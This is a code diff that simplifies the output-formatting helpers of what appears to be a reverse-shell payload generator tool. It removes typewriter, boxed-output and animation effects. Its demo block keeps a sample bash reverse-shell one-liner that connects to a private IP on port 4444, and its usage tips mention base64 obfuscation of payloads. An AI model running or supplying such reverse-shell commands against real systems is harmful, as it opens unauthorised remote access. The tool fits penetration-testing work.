@@ -129,17 +129,9 @@ def get_random_banner() -> str:
     return random.choice(banners)()
 
 
-def print_typewriter(text: str, delay: float = 0.03) -> None:
-    """Print text with typewriter effect"""
-    for char in text:
-        sys.stdout.write(char)
-        sys.stdout.flush()
-        time.sleep(delay)
-    print()
 
-
-def print_banner(style: str = "main", fancy: bool = False) -> None:
-    """Print banner with optional fancy effects"""
+def print_banner(style: str = "main") -> None:
+    """Print banner"""
     if style == "main":
         banner = get_main_banner()
     elif style == "skull":
@@ -155,42 +147,15 @@ def print_banner(style: str = "main", fancy: bool = False) -> None:
     else:
         banner = get_main_banner()
     
-    if fancy:
-        print_typewriter(banner, delay=0.01)
-    else:
-        print(banner)
+    print(banner)
 
 
-def format_payload_output(shell_name: str, payload: str, description: str = "", fancy: bool = False) -> str:
+def format_payload_output(shell_name: str, payload: str, description: str = "") -> str:
     """Format payload output with styling"""
-    if fancy:
-        header = f"{Colors.NEON_CYAN}{Colors.BOLD}╔{'═' * 60}╗{Colors.RESET}"
-        title = f"{Colors.NEON_CYAN}{Colors.BOLD}║{Colors.YELLOW} {shell_name:^58} {Colors.NEON_CYAN}║{Colors.RESET}"
-        separator = f"{Colors.NEON_CYAN}╠{'═' * 60}╣{Colors.RESET}"
-        
-        # Word wrap the payload if it's too long
-        max_width = 56
-        if len(payload) > max_width:
-            wrapped_lines = []
-            for i in range(0, len(payload), max_width):
-                line = payload[i:i+max_width]
-                wrapped_lines.append(f"{Colors.NEON_CYAN}║{Colors.WHITE} {line:<{max_width}} {Colors.NEON_CYAN}║{Colors.RESET}")
-        else:
-            wrapped_lines = [f"{Colors.NEON_CYAN}║{Colors.WHITE} {payload:<{max_width}} {Colors.NEON_CYAN}║{Colors.RESET}"]
-        
-        footer = f"{Colors.NEON_CYAN}╚{'═' * 60}╝{Colors.RESET}"
-        
-        result = [header, title, separator] + wrapped_lines + [footer]
-        
-        if description:
-            result.append(f"{Colors.DIM}{Colors.CYAN}💡 {description}{Colors.RESET}")
-        
-        return "\n".join(result)
-    else:
-        result = f"{Colors.BOLD}{Colors.GREEN}[{shell_name}]{Colors.RESET}\n{payload}"
-        if description:
-            result += f"\n{Colors.DIM}{Colors.CYAN}💡 {description}{Colors.RESET}"
-        return result
+    result = f"{Colors.BOLD}{Colors.GREEN}[{shell_name}]{Colors.RESET}\n{payload}"
+    if description:
+        result += f"\n{Colors.DIM}{Colors.CYAN}💡 {description}{Colors.RESET}"
+    return result
 
 
 def print_success(message: str) -> None:
@@ -218,24 +183,12 @@ def print_separator(char: str = "═", length: int = 60, color: str = Colors.CYA
     print(f"{color}{char * length}{Colors.RESET}")
 
 
-def animate_progress(text: str = "Generating payloads", duration: float = 2.0) -> None:
-    """Animated progress indicator"""
-    frames = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
-    start_time = time.time()
-    
-    while time.time() - start_time < duration:
-        for frame in frames:
-            print(f"\r{Colors.CYAN}{frame} {text}...{Colors.RESET}", end="", flush=True)
-            time.sleep(0.1)
-    
-    print(f"\r{Colors.GREEN}✅ {text} complete!{Colors.RESET}")
 
 
 def print_usage_tip() -> None:
     """Print a random usage tip"""
     tips = [
         "💡 Use --copy to automatically copy payload to clipboard",
-        "🔥 Try --fancy for Hollywood-style output",
         "🌐 IPv6 addresses are automatically detected",
         "🎭 Use --obfuscate to base64 encode your payloads",
         "⚡ Generate all payloads at once with --all",
@@ -284,8 +237,5 @@ if __name__ == "__main__":
     
     sample_payload = "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1"
     
-    print("\nNormal formatting:")
+    print("\nPayload formatting:")
     print(format_payload_output("Bash", sample_payload, "Classic bash reverse shell"))
-    
-    print("\nFancy formatting:")
-    print(format_payload_output("Bash", sample_payload, "Classic bash reverse shell", fancy=True))
